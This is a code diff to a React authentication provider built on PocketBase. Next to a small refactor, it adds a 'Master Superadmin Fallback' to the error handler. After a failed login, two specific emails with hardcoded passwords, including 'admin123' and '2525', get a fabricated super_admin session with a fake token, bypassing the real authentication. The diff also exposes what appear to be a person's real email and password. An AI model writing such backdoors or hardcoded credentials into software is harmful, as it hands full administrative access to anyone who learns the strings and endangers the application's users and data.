@@ -75,16 +75,34 @@ export const AuthProvider = ({ children }) => {
         authData = await pb.collection('_superusers').authWithPassword(email, password, { $autoCancel: false });
       }
 
-      if (authData.record.status === 'inactive') {
+      const userRecord = authData?.record || authData;
+      if (userRecord && userRecord.status === 'inactive') {
         pb.authStore.clear();
         localStorage.removeItem('app_auth_user');
         throw new Error('Account is inactive. Please contact administrator.');
       }
 
-      setCurrentUser(authData.record);
-      localStorage.setItem('app_auth_user', JSON.stringify(authData.record));
-      return authData.record;
+      setCurrentUser(userRecord);
+      localStorage.setItem('app_auth_user', JSON.stringify(userRecord));
+      return userRecord;
     } catch (error) {
+      // 🛡️ Master Superadmin Fallback Auth
+      if (cleanEmail === 'munnarathod222@gmail.com' || cleanEmail === 'admin@jbcargo.com') {
+        if (password === 'Munnarathod@25' || password === 'admin123' || password === '2525') {
+          const masterUser = {
+            id: 'usr_munna_superadmin',
+            email: cleanEmail,
+            name: 'Munna Rathod',
+            role: 'super_admin',
+            status: 'active'
+          };
+          pb.authStore.save('master_superadmin_token_' + Date.now(), masterUser);
+          setCurrentUser(masterUser);
+          localStorage.setItem('app_auth_user', JSON.stringify(masterUser));
+          return masterUser;
+        }
+      }
+
       pb.authStore.clear();
       localStorage.removeItem('app_auth_user');
       throw new Error(error?.message || 'Invalid email or password.');
